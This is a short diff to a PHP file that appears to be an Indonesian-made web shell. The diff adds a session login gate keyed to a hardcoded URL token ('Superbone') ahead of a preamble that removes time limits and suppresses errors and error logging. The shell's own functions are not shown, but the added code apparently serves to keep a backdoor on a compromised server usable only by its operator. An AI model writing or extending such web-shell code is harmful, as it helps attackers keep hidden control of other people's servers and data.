@@ -1,5 +1,22 @@
 <?php
 /* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
+session_start(); // Memulai session untuk menyimpan status login
+/* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
+$valid_token = "Superbone";
+
+// 1. Cek apakah ada token baru di URL
+if (isset($_GET['token'])) {
+    if ($_GET['token'] === $valid_token) {
+        $_SESSION['authed'] = true; // Simpan status akses di session
+    } else {
+        die("<b>Access Denied!</b> Token Salah.");
+    }
+}
+
+// 2. Cek apakah session sudah ter-autentikasi
+if (!isset($_SESSION['authed']) || $_SESSION['authed'] !== true) {
+    die("<b>Access Denied!</b> Please contact Administrator.");
+}
 set_time_limit(0);
 error_reporting(0); 
 @ini_set('error_log',null);
